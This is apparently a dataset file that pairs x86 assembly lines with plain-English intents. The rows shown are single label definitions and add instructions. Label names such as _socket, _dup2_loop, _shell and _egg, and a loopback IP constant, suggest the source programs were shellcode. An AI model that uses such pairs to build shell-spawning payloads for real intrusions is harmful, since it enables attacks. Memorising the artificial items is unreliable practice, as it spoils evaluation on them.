SNIPPETS	INTENTS
_appendfile:	define the _appendfile label
_build:	define the _build label
_child:	define the _child label
_close:	define the _close label
_cmd:	define the _cmd label
_continue:	define the _continue label
_dup2_loop:	define the _dup2_loop label
_egg:	define the _egg label
_exec:	define the _exec label
_execline:	define the _execline label
_exit:	define the _exit label
_file:	define the _file label
_ip equ 0x0100007f	define ip equal to 0x0100007f
_isegg:	define the _isegg label
_load_data:	define the _load_data label
_next:	define the _next label
_param:	define the _param label
_params:	define the _params label
_parent_read:	define the _parent_read label
_parent:	define the _parent label
_random:	define the _random label
_return:	define the _return label
_setsockopt:	define the _setsockopt label
_shell:	define the _shell label
_socket:	define the _socket label
_start:	_start function
_start:	define the _start label
_user:	define the _user label
_while_loop:	define the _while_loop label
_write:	define the _write label
1:	define the label 1
1:	define the numeric label 1
2:	define the label 2
2:	define the numeric label 2
3:	define the label 3
3:	define the numeric label 3
a_letter db 'd'	allocate one byte of memory for a_letter variable and initialize it to 'd'
add [ebp-4], esi	add esi into memory address ebp-4
add ah, bh	add the contents of the bh register into the ah register
add al, 0x25	add 0x25 to the al register
add al, 0x3	add 0x3 to the contents in al and save the result in al
add al, 0x33	add 0x33 to the contents in al and save the result in al
add al, 0x40	add 0x40 to the al register
add al, 0x66	add 0x66 to the contents in al and save the result in al
add al, 0xa	add 0xa to the al register
add al, 0xb	add 0xb to the al register
add al, 2	add the value 2 to the contents of the al register
add al, byte '0'	add byte '0' to al
add al, byte [edi]	add the byte in edi to the al register
add ax, [di + 20]	add memory[di + 20] to ax
add ax, 01	add 01 to ax
add ax, bx	add the contents of bx into ax
add bl, 0x2	add 0x2 to the contents in bl and save the result in bl
add bx, ax	add ax to bx
add byte [esi], 2	add the byte value 2 to the esi register
add byte [var], 10	add 10 to the single byte stored at memory address var
add byte [var], 20	add 20 to the single byte stored at memory address var
add byte [var], 30	add 30 to the single byte stored at memory address var
add byte_value, 65	add an immediate operand 65 to byte_value
add byte_value, dl	add the register dl in the memory location byte_value
add cl, 0x2	add 0x2 to the contents in cl and save the result in cl
add cl, 0xb8	add 0xb8 to the cl register
add dx, 0x1b	add the value 0x1b into the dx register
add dx, 0x2f2f	add 0x2f2f to the contents in dx and save the result in dx
add eax, [ebp-4]	add the contents of the local variable stored at ebp-4 into eax
add eax, 0x10	add 0x10 to eax
add eax, 0x12345678	add 0x12345678 to the contents in eax and save the result in eax
add eax, 0x2d383638	add 0x2d383638 to the contents in eax and save the result in eax
add eax, 0x31179798	add 0x31179798 to the contents in eax and save the result in eax
add eax, 10	add 10 to eax
add eax, 10	add 10 to the contents of eax
add eax, 16	add 16 to eax
add eax, 2	add 2 to the contents of the eax register
add eax, 2	add 2 to the eax register
add eax, 2	add decimal 2 to eax register
add eax, 24	add 24 to eax
add eax, 4	add 4 to eax
add eax, 40000h	add 40000h to eax register
add eax, 48	add 48 to eax
add eax, 48	add decimal 48 to eax
add eax, c	add c to eax
add eax, ebx	add ebx to eax
add eax, ebx	add ebx to eax and store the result in eax
add eax, ebx	add the contents of ebx to the contents of eax
add eax, edx	add edx to eax
add eax, edx	add the contents of edx to the contents of eax
add eax, edx	add the contents of the edx register to the contents of eax register
add eax, esi	add the contents of esi to the contents of eax
